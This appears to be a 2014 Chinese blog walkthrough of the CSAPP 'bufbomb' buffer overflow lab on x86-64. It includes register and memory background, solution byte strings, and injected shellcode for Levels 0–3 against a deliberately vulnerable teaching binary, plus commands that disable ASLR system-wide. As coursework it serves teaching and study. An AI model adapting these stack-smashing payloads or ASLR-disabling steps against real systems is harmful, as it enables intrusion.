<!doctype html> <meta charset="utf-8"> <title>Dear Assembly（3）· Perfect Freeze!</title> <meta name="viewport" content="width=device-width,initial-scale=1">  <meta name="description" content="（大概是 Lab 三部曲）"> <link rel="alternate" href="/feed.xml" type="application/atom+xml"> <style>.heading,.sub-heading,body{font-family:'Helvetica Neue',Arial,'Hiragino Sans GB',sans-serif}.content header h1,.heading{-webkit-font-smoothing:antialiased}.cf:after,.cf:before,.content .status:before,.content:after,.content:before,body:before{content:''}.cf:after,.content blockquote footer:after,.content:after{clear:both}.cf:after,.cf:before{display:table}*,:after,:before{box-sizing:border-box;margin:0;padding:0}body{font-size:1.8vw;line-height:1.42857143;margin:0 auto;padding:0 16%;-webkit-transition:all .3s ease .2s;transition:all .3s ease .2s;color:#000;background:#fff;text-rendering:optimizelegibility;image-rendering:optimizequality}@media (max-width:1000px){body{font-size:2.52vw;padding-right:8%;padding-left:8%}}@media (max-width:640px){body{font-size:3.6vw;padding-right:4%;padding-left:4%}}@media (max-width:400px){body{font-size:5.04vw}}@media (max-device-width:480px),(max-device-width:1024px){body{-webkit-text-size-adjust:none}}body:before{position:absolute;z-index:-9999;top:0;left:0;width:100%;height:1vmax;pointer-events:none;opacity:.2;background:#6cb5fc}.heading{font-size:280%;font-weight:700;letter-spacing:-.06em}.sub-heading{font-size:72%;font-weight:400;letter-spacing:.08em;opacity:.5}.content .status,.content a,.navigation{font-weight:700}button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}.content h2,.content h3,.content h4,.content h5,.content h6,.content header h1{font-family:'Helvetica Neue',Arial,'Hiragino Sans GB',sans-serif}button,input,select[multiple],textarea{background-image:none}a,button{-webkit-transition:color .5s ease,border-color .5s ease,background .5s ease,opacity 1.5s ease;transition:color .5s ease,border-color .5s ease,background .5s ease,opacity 1.5s ease;text-decoration:none;color:#000}a:focus,a:hover,button:focus,button:hover{-webkit-transition:color .1s ease,border-color .1s ease,background .1s ease,opacity .1s ease;transition:color .1s ease,border-color .1s ease,background .1s ease,opacity .1s ease;border-bottom:.1em solid}a[disabled],button[disabled]{cursor:not-allowed;opacity:.4}hr,img{border:0}del{text-decoration:line-through}::-moz-selection{color:#6cb5fc;background:rgba(0,0,0,.02)}::selection{color:#6cb5fc;background:rgba(0,0,0,.02)}::-webkit-input-placeholder{opacity:.1;color:#000}.logo{display:block;height:1vmax;margin:0 0 1.4vmax;opacity:0;background:#6cb5fc}.logo:focus,.logo:hover{opacity:1;border-bottom:none!important;background:#000}.logo h1{height:0;text-indent:-99999em}.navigation{font-size:50%;margin:0 -1.1em 16vmin;letter-spacing:.45em;text-transform:uppercase}.navigation li{line-height:2;display:inline-block;list-style:none}.navigation li a{padding:.5em 1.2em}.navigation li a:focus,.navigation li a:hover{color:#6cb5fc;border:none}.current a{color:#6cb5fc}body:hover .latest{color:#6cb5fc!important}.content .status{font-size:75%;margin:1vmin 0 0}.content .status:before{display:inline-block;width:.8em;height:.8em;margin-right:.8vw;border-radius:50%;background:rgba(0,0,0,.2)}.content .status.available:before{background:#0cf}.content .status.available a{color:#0cf}.content .status.unavailable:before{background:#ccc}.content .status.unavailable a{color:#ccc}.content{margin-bottom:16vmin}.content:after,.content:before{display:table}.content article>:last-child,.content article>:last-child>:last-child,.content article>:last-child>:last-child>:last-child,.content article>:last-child>:last-child>:last-child>:last-child{margin-bottom:0!important}.content .page-content>:first-child,.content .page-content>:first-child>:first-child,.content .post-content>:first-child,.content .post-content>:first-child>:first-child{margin-top:0}.content p{line-height:1.71428571;margin:0 0 1.1em}.content header{padding-bottom:16vmin}.content header h1{font-size:280%;font-weight:700;line-height:1.1;margin:0 0 .1em;letter-spacing:-.06em;-webkit-hyphens:none;-moz-hyphens:none;hyphens:none;-ms-hyphens:none}.content header h1 svg{display:block;max-width:100%}.content header h1 img,.content header h1 svg{margin-bottom:.3em}@media (max-width:640px){.content header h1{font-size:280%}.content header h1 img,.content header h1 svg{width:100%!important;height:100%!important}}.content header .latest-post{font-size:80%;font-weight:400;line-height:1.2;margin-top:16vmin}.content ol li,.content pre,.content ul li{line-height:1.71428571}.content header .latest-post a{font-weight:700}.content header small{display:block;margin:2vmin 0 0;letter-spacing:.1em}.content h2,.content h3,.content h4,.content h5,.content h6{font-weight:400;margin:10vmin 0 1rem;letter-spacing:.08em}.content ol,.content ul{margin:0 0 1em 1.5em}.content ol li ol,.content ol li>ul,.content ul li ol,.content ul li>ul{margin-bottom:0}.content ol{margin-left:1.75em}.content iframe,.content img,.content video{display:block;max-width:100%;margin:0 0 4vmin}.content blockquote{position:relative;margin-bottom:2em}.content blockquote>p{padding-left:.8em;border-left:2px solid}.content blockquote footer:after,.content blockquote footer:before{display:table;content:''}.content blockquote cite{font-size:90%;font-style:normal;float:right}.highlight .c,.highlight .c1,.highlight .cm,.highlight .cs,.highlight .ge{font-style:italic}.content blockquote cite:before{content:'\2500\2500\00a0'}.content hr{margin-top:2em;margin-bottom:2em;border-top:1px solid rgba(204,204,204,.2)}.content sup{font-size:75%}.content abbr{border-bottom:1px dashed}.content code,.content pre{font-family:Menlo,monospace;color:#54c7fc}.largetype,.list h1{font-family:'Helvetica Neue',Arial,'Hiragino Sans GB',sans-serif;letter-spacing:-.06em;-webkit-font-smoothing:antialiased;font-weight:700}.content p code{word-wrap:break-word;word-break:break-word}.content pre{font-size:80%;overflow-x:scroll;margin:0 0 1em;padding:1em;background:rgba(0,136,255,.04);-webkit-overflow-scrolling:touch}.content form input{display:block;width:100%;margin:0 0 1vmin;padding:1vmin 0;-webkit-transition:padding .2s ease;transition:padding .2s ease;border:none;border-bottom:1px solid rgba(0,0,0,.2);border-radius:0;outline:0}.content form input:focus{padding:1vmin;border-color:#000;background:rgba(0,0,0,.02)}.content input:focus:required:invalid:focus,.content select:focus:required:invalid:focus,.content textarea:focus:required:invalid:focus{border-color:#6cb5fc;background:rgba(108,181,252,.05);box-shadow:none}.content table{font-size:90%;width:100%;margin:0 0 1em;border-spacing:0;border-collapse:collapse}.content table td,.content table th{padding:.6em}.content table th{text-align:left;border-bottom:2px solid rgba(0,0,0,.06)}.content table td{border-top:1px solid rgba(0,0,0,.04)}[lang=ja],[lang=zh]{text-align:justify}[lang=ja] header,[lang=zh] header{text-align:start}.margin-fix:first-letter{margin-left:-.6em}.tweet{margin-top:10vmin}.largetype{font-size:280%;font-size:200%;margin-bottom:.5em!important}.browser{position:relative;margin:0 0 4vmin!important;padding-top:24px;border-radius:5px 5px 0 0;background:rgba(255,255,255,.1);box-shadow:0 0 0 1px rgba(0,0,0,.05)}.browser:before{position:absolute;top:8px;left:10px;display:block;width:8px;height:8px;content:'';border-radius:50%;background:#fcdddf;box-shadow:16px 0 0 0 rgba(254,240,203,.96),32px 0 0 0 rgba(177,247,185,.96),0 0 0 1px rgba(156,11,21,.3),16px 0 0 1px rgba(147,108,4,.3),32px 0 0 1px rgba(11,107,22,.3)}.browser img{margin:0;box-shadow:0 -1px 0 0 rgba(0,0,0,.05)}.download,.note,.store{padding-left:.8em;border-left:2px solid #6cb5fc}.footnotes{font-size:90%}:target [rel=footnote],:target [rev=footnote]{color:#6cb5fc}.list{display:block;margin:0 0 1.4vmin}.list h1{font-size:280%;font-size:150%;line-height:1.1;margin:0;opacity:1}.list .external:focus,.list .external:hover{border:none}@media (max-width:640px){.list h1{font-size:180%}.list .external{display:none}}.external span{display:inline-block;width:.2em;height:.2em;margin:0 .1em;-webkit-transition:-webkit-transform .4s ease;transition:transform .4s ease;vertical-align:middle;border-radius:50%;background:#000}.external:focus span,.external:hover span{-webkit-transform:scale(1.4);-ms-transform:scale(1.4);transform:scale(1.4)}.footer{font-size:72%;padding:0 0 16vmin;text-transform:lowercase}.footer ul li{display:inline}.footer ul li:after{padding:0 .6vw;content:' / ';opacity:.3}.footer ul li:last-child:after{content:none}.highlight pre{background:rgba(230,230,230,.1)}.highlight code{color:#bacbdb}.highlight .c{color:#bfd0db}.highlight .err{color:#c3a9b9;background-color:#e3d2d2}.highlight .cm{color:#bfd0db}.highlight .cp{font-weight:700;color:#bfd0e0}.highlight .c1{color:#bfd0db}.highlight .cs{font-weight:700;color:#bfd0e0}.highlight .gd{color:#92a2b2;background-color:#fdd}.highlight .gd .x{color:#92a2b2;background-color:#faa}.highlight .gr{color:#c5a2b2}.highlight .gh{color:#bfd0e0}.highlight .gi{color:#92a2b2;background-color:#dfd}.highlight .gi .x{color:#92a2b2;background-color:#afa}.highlight .go{color:#bacbdb}.highlight .gp{color:#abbbcb}.highlight .gu{color:#c5d5e5}.highlight .gt{color:#c5a2b2}.highlight .kt{font-weight:700;color:#a6bbdb}.highlight .m{color:#92d0e0}.highlight .s{color:#d4a7c6}.highlight .na{color:#92c8d8}.highlight .nb{color:#92cae8}.highlight .nc{font-weight:700;color:#a6bbdb}.highlight .no{color:#92c8d8}.highlight .ni{color:#b8a2d8}.highlight .ne,.highlight .nf{font-weight:700;color:#bfa2b2}.highlight .nn{color:#abbbcb}.highlight .nt{color:#92a2d8}.highlight .nv{color:#92c8d8}.highlight .w{color:#cadaea}.highlight .mf,.highlight .mh,.highlight .mi,.highlight .mo{color:#92d0e0}.highlight .s2,.highlight .sb,.highlight .sc,.highlight .sd,.highlight .se,.highlight .sh,.highlight .si,.highlight .sx{color:#d4a7c6}.highlight .sr{color:#92d0bd}.highlight .s1{color:#d4a7c6}.highlight .ss{color:#bfa2d4}.highlight .bp{color:#bfd0e0}.highlight .vc,.highlight .vg,.highlight .vi{color:#92c8d8}.highlight .il{color:#92d0e0}.highlight .gs,.highlight .k,.highlight .kc,.highlight .kd,.highlight .kp,.highlight .kr,.highlight .o,.highlight .ow{font-weight:700}.loaded .intense-wrap article p>img:not(.nointense){cursor:-webkit-zoom-in;cursor:zoom-in}.loaded.intense-open{cursor:-webkit-zoom-out;cursor:zoom-out}.gist{font-size:80%!important}.gist code,.gist pre{padding:0;color:inherit;background-color:transparent}.gist .gist-data{font-family:Menlo,monospace!important}.gist .gist-data .file-data{font-size:100%!important}.gist .gist-data .file-data>table{margin-bottom:0!important}.gist .highlight{font-size:90%!important}.gist .markdown-body{font-size:100%!important;padding:1em!important}@media print{.content .page-content,.content .post-content,img{max-width:100%!important}*,:after,:before{color:#000!important;background:0 0!important;box-shadow:none!important;text-shadow:none!important}body{margin:0!important;padding:10mm!important}a,a:visited{text-decoration:none}.content .page-content a[href]:after,.content .post-content a[href]:after{font-weight:400;content:' (' attr(href) ')'}.content .page-content a[href^='#']:after,.content .page-content a[href^='javascript:']:after,.content .post-content a[href^='#']:after,.content .post-content a[href^='javascript:']:after{content:''}.content .page-content abbr[title]:after,.content .post-content abbr[title]:after{font-weight:400;content:' (' attr(title) ')'}blockquote,img,pre,tr{page-break-inside:avoid}thead{display:table-header-group}h2,h3,h4,h5,h6,p{orphans:3;widows:3}h2,h3{page-break-after:avoid}.footer,.navigation{display:none}}.blog-title,.head-img{display:block;text-align:center}.content h2{font-size:108%;opacity:.6}.content h3{font-size:96%;opacity:.5}.content h4{font-size:84%;opacity:.4}.content h5{font-size:72%;opacity:.3}.content h6{font-size:60%;opacity:.2}.blog-title{vertical-align:middle;color:#6cb5fc}.navigation{text-align:center}.head-img{max-width:30%;max-height:30%;margin-right:auto;margin-left:auto;-webkit-transition:-webkit-transform 1000ms;transition:transform 1000ms;-webkit-animation:fade-in-down .6s;animation:fade-in-down .6s;-webkit-animation-delay:.2s;animation-delay:.2s;border-radius:100%}.head-img:hover{-webkit-transform:rotate(-360deg);-ms-transform:rotate(-360deg);transform:rotate(-360deg)}</style>  <link rel="canonical" href="http://blog.cee.moe/dear-assembly-3.html">      <meta property="og:type" content="article"> <meta property="og:site_name" content="Perfect Freeze!"> <meta property="og:title" content="Dear Assembly（3）"> <meta property="og:url" content="http://blog.cee.moe/dear-assembly-3.html"> <meta property="og:description" content="（大概是 Lab 三部曲）"> <meta name="twitter:card" content="summary"> <meta name="twitter:title" content="Dear Assembly（3）"> <meta name="twitter:url" content="http://blog.cee.moe/dear-assembly-3.html"> <meta name="twitter:description" content="（大概是 Lab 三部曲）"> <meta name="twitter:site" content="@Ceecirno"> <meta name="twitter:creator" content="@Ceecirno">   <style></style><header> <a href="/" class="logo" accesskey="x"> <h1>Perfect Freeze!</h1> </a> </header>  <nav class="navigation"> <ul> <li> <a href="/"> Home </a> </li> <li> <a href="/articles/"> Articles </a> </li> <li> <a href="/works/"> Works </a> </li> <li> <a href="/friends/"> Friends </a> </li> <li> <a href="/about/"> About </a> </li> </ul> </nav>  <main class="content" role="main">                  <article>  <header> <h1> Dear Assembly（3） <span></span> </h1> <small> By <span rel="author">Cee</span> on <time datetime="2014-08-01T00:00:00+08:00">Aug 1, 2014</time> </small> </header>  <div class="post-content"> <p><del>（大概是 Lab 三部曲）</del></p> <hr> <h3>Intro</h3> <p>引言的话我想推荐大家先去看 Ricter 菊苣的一篇文章：<a href="http://www.ricter.me/articles/159">缓冲区溢出的 Hello World</a>。</p> <p>这篇文章的话讲的是 32 位的软娘插屁系统下的缓存区溢出，所以你看到的寄存器还是 <code>eax</code>、<code>ebx</code>等等。</p> <p>今天给大家介绍的话还是主要是通过 64 位系统下的操作。毕竟寄存器数量翻了一番，位数也翻了一番，效率也更高了。最最最不同的就是汇编的代码也就是实现方式不同了。这里的话先讲一点基础知识(｢･ω･)｢。</p> <h4>关于寄存器</h4> <ol> <li><p>之前提到过，每个寄存器也是从 32 位升级到了 64 位。对于 64 位的寄存器 <code>%rax</code>，它的后 32 位就相当于原来的 <code>%eax</code>。</p></li> <li><p>新增了 8 个用于存放参数和临时变量的寄存器 <code>%r8</code> ~ <code>r15</code>。它们的后 32 位可用作 <code>%r8d</code> ~ <code>%r15d</code>。</p></li> <li><p>所有的寄存器可以按照 8/16/32/64 位读取和写入数据。</p></li> <li><p>增加了寄存器，减少了 <code>push</code>（压栈）和 <code>pop</code>（出栈）的次数。说明一下不同寄存器的作用：</p></li> </ol> <ul> <li><p><code>%rax</code>：保存返回值。</p></li> <li><p><code>%rdi</code>/<code>%rsi</code>/<code>%rdx</code>/<code>%rcx</code>/<code>%r8</code>/<code>%r9</code>：保存参数，最多可以保存 6 个参数，大于 6 个采取同 32 位的做法压栈。</p></li> <li><p><code>%r10</code>/<code>%r11</code>：调用函数（Caller）保存调用前环境参数。</p></li> <li><p><code>%rsp</code>：栈顶指针。</p></li> <li><p><code>%rbp</code>：基址指针。</p></li> <li><p><code>%rbx</code>：基地址。</p></li> <li><p><code>%r12</code> ~ <code>%r15</code>：被调用函数（Callee）的临时变量。</p></li> </ul> <h4>关于内存</h4> <ol> <li>分为运行时栈（Stack），堆（Heap），数据（Data）和指令（Text）四部分：</li> </ol> <ul> <li><p>栈（Stack）：8MB的限制大小（IA32）。</p></li> <li><p>堆（Heap）：动态分配，使用<code>malloc</code>/<code>calloc</code>/<code>new</code>函数。</p></li> <li><p>数据（Data）：静态分配，部分只读，部分可读写。</p></li> <li><p>指令（Text）：运行时机器指令，只读。</p></li> </ul> <ol> <li>四部分在内存中的位置由高到低。</li> </ol> <h3>Level 0</h3> <p>最简单的 level 了。这个 level 前一定要把调用函数的机制搞懂。</p> <p>Level 0 是希望在调用 <code>test()</code> 函数的时候利用内部的 <code>getbuf()</code> 使程序跳转到 <code>smoke()</code> 中继续执行。先来看看 <code>getbuf()</code> 函数的全貌：</p> <script src="https://gist.github.com/cee/822ecb72b74a73eaf067.js"></script><p>buffer 的长度是 36 个 char，加上压栈时的 <code>%rbx</code> 和 <code>%rbp</code>，前面一共占用 36 + 16 = 52 个 byte，最后是 8 位的 return address。所以答案就是：</p> <blockquote> <p>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （36 char）<br> 00 00 00 00 00 00 00 00 （%rbx）<br> 00 00 00 00 00 00 00 00 （%rbp）<br> 00 00 00 00 c0 10 40 00 （Return address，call smoke）<br> （注意小端表示）</p> </blockquote> <h3>Level 1</h3> <p>和 Level 0 的区别仅仅在于传递参数的时候有个 <code>val</code> 要替换成自己的 cookie。看一下调用的代码 <code>fizz()</code>：</p> <script src="https://gist.github.com/cee/e5d4d5c91d87d91a058f.js"></script><p>参数共 7 个，而且 <code>val</code> 正好是第 7 个。预备知识里面也提到了，对于一个函数最多可以在寄存器中存放 6 个参数，也就是说 <code>val</code> 此时是压栈存放的。类似于 Level 0，我们也就知道了 cookie 应该保存在哪里了：</p> <blockquote> <p>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （36 char）<br> 00 00 00 00 00 00 00 00 （%rbx）<br> 00 00 00 00 00 00 00 00 （%rbp）<br> 00 00 00 00 70 10 40 00 （Return address，call fizz）<br> 00 00 00 00 （Alignment）<br> 00 00 00 00 00 00 00 00 0b 43 71 79 17 a7 27 37 （unsigned long long）</p> </blockquote> <p>这里 Alignment 的作用是为了让 unsigned long long 确保地址是 16 字节对齐。</p> <h3>Level 2</h3> <p>从这关开始越来越有难度了，Level 2 是第二天睡醒起来的下午时间做的。<code>bang()</code> 这个函数和上面的 <code>fizz()</code> 很像，只不过参数变成了全局变量 <code>global_value</code>：</p> <script src="https://gist.github.com/cee/f9f9679be576e6e64322.js"></script><p>Hints 里面也提到了一些 tricks：</p> <blockquote> <p>Do not attempt to use either a <code>jmp</code> or a <code>call</code> instruction to jump to the code for <code>bang()</code>. These instructions use PC-relative addressing, which is very tricky to set up correctly. Instead, push an address on the stack and use the <code>retq</code> instruction.</p> </blockquote> <p>不能通过 <code>jmp</code> 和 <code>call</code> 指令跳转，因为是和 Counter 相对寻址的。我们需要找到 <code>bang()</code> 的入口地址并且把 <code>cookie</code> 复制一份到 <code>global_value</code> 中。继续来看 <code>bang()</code> 函数的汇编函数：</p> <script src="https://gist.github.com/cee/f96b2e2fd0ba6768be62.js"></script><p>找到我们需要的函数入口 <code>0x401020</code>，<code>cookie</code> 的地址 <code>0x602320</code>，<code>global_value</code> 的地址 <code>0x602308</code>。这时我们需要写一段汇编来实现函数的跳转：</p> <blockquote> <p>movabs 0x602320, %rax ;自己用的直接是立即数<br> movabs %rax, 0x602308<br> pushq $0x401020<br> retq</p> </blockquote> <p>生成对应的 <code>.d</code> 文件：</p> <blockquote> <p>gcc -c bang.s<br> objdump -d bang.o &gt; bang.d</p> </blockquote> <p>写出最后的答案：</p> <blockquote> <p>48 b8 0b 43 71 79 17 a7 27 37 48 a3 08 23 60 00 00 00 00 00 68 20 10 40 00 c3 （attack code, 26 bytes）<br> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 （26 bytes）<br> 00 00 a0 be ff ff ff 7f （%rax，where we read buffer）</p> </blockquote> <h3>Level 3</h3> <p>最后一关，啊哈，Instruction 上又<del>很邪恶地</del>（This style of attack is tricky）写出了要求：要更改 <code>%rbp</code> 和返回地址来实现攻击。最终是需要我们在 <code>getbuf()</code> 函数中返回我们的 <code>cookie</code> 来调用 <code>test()</code>：</p> <script src="https://gist.github.com/cee/f4cc0270a4c57aa036b3.js"></script><p>思想其实和上一题类似，也是要写一段 attack code：</p> <blockquote> <p>movabs $0x3727a7177971430b, %rax ;复制cookie<br> movabs $0x7fffffffbf00, %rbp ;更改%rbp<br> pushq $0x400ef3 ;getbuf调用后的第一条指令，接着继续执行<br> retq</p> </blockquote> <p>生成后写出答案：</p> <blockquote> <p>48 b8 0b 43 71 79 17 a7 27 37 48 bd 00 bf ff ff ff 7f 00 00 68 f3 0e 40 00 c3 （attack code, 26 bytes）<br> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00（26 bytes）<br> 00 00 a0 be ff ff ff 7f （%rax，where we start comparing）<br> <strong>撒花完工，55分到手~</strong></p> </blockquote> <h3>Why Within Gdb</h3> <p>Instruction 在 Level 2 里面提到了这么一段话：</p> <blockquote> <p>For level 2, you will need to run your exploit within gdb for it to succeed. (the VM has special memory protection that prevents execution of memory locations in the stack. Since gdb works a little differently, it will allow the exploit to succeed.)</p> </blockquote> <p>Level 3 也同样有类似的话：</p> <blockquote> <p>For level 3, you will need to run your exploit within gdb for it to succeed.</p> </blockquote> <p>这是为什么呢？自己一开始表示很困惑，于是在 Forum 上提出了<a href="https://class.coursera.org/hwswinterface-002/forum/thread?thread_id=863">这个问题</a>，很快就有个好心的同学回答了。</p> <p>我们知道对于大多数 GNU/Linux 的发行版都有内存保护机制。其中有一种用来保护内存不被攻击的方法叫做 <strong>Address Space Layout Randomization（ASLR，位址空间配置随机加载）</strong>。位址空间配置随机加载利用随机方式配置资料位址，让某些敏感资料（例如操作系统内核）能配置到一个恶意程式未能事先得知的位址，令攻击者难于进行攻击。在系统中，ASLR 是默认开启的，而 gdb 则默认禁用了 ASLR。所以我们编译后的 <code>bufbomb</code> 中的地址是可以被确认的，这也就解释了为什么在 gdb 中可以改写全局变量。</p> <p>如果想要在系统下执行，可以通过 <code>sysctl kernel.randomize_va_space = 0</code> 或者 <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code> 来解除 ASLR，但是这里<strong>肯定不推荐</strong>这么做/w\。</p> <h3>References</h3> <ul> <li><p>两篇在 32 位 Linux 下的解释也相当精彩：</p> <ul> <li><a href="http://blog.csdn.net/u013648407/article/details/25742553">CSApp Buffer Lab</a></li> <li><a href="http://blog.youlingman.info/csapp-bufbomb-lab-solve/">CSApp Bufbomb Lab解题记录</a></li> </ul></li> <li><p>当然还有 Ricter 菊苣的：</p> <ul> <li><a href="http://www.ricter.me/articles/159">缓冲区溢出的 Hello World</a></li> </ul></li> <li><p>什么是 ASLR：</p> <ul> <li><a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">Wikipedia</a></li> <li>课本《深入理解计算机系统（原作第二版）》P180</li> </ul></li> <li><p>GNU/Linux 下的缓存区溢出：</p> <ul> <li><a href="http://drops.wooyun.org/papers/1421">做个试验：简单的缓冲区溢出</a></li> <li><a href="http://www.exploit-db.com/papers/24085/">Stack Smashing On A Modern Linux System</a></li> </ul></li> </ul> <hr> <p>感谢观众姥爷们翻完了这篇毫无技术的文章。两次实验给自己带来了很多知识上的长进，甚至是做出来后的惊喜，也再一次深入了解了 C/C++ 的函数调用和 x86-64 下的汇编，算是对课堂知识的一次扩充。</p> <p>如果有机会的话之后的 lab 作业也会写点总结的文章。恩就这样~</p> </div> </article> </main>  <footer class="footer"> <ul style="padding-bottom:2%"> <li><a href="/">Perfect Freeze!</a></li> <li><a href="http://sparanoid.com/lab/amsf/" title="Almace Scaffolding">AMSF</a></li> <li><a href="https://github.com/PerfectFreeze" title="Perfect Freeze - Lab">Lab</a></li> <li><a href="/feed.xml" title="Feed - Atom (The Atom Syndication Format)">Feed</a></li> </ul> <div id="disqus_thread"></div> <script type="text/javascript">var disqus_shortname="perfectfreeze";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}();</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> </footer> <script>!function(e,a,t,n,c,o,s){e.GoogleAnalyticsObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,o=a.createElement(t),s=a.getElementsByTagName(t)[0],o.async=1,o.src=n,s.parentNode.insertBefore(o,s)}(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-48656879-8","auto"),ga("send","pageview");</script><script></script>
<!--
 © Tunghsiao Liu.
 almace-scaffolding - v0.0.26
 -->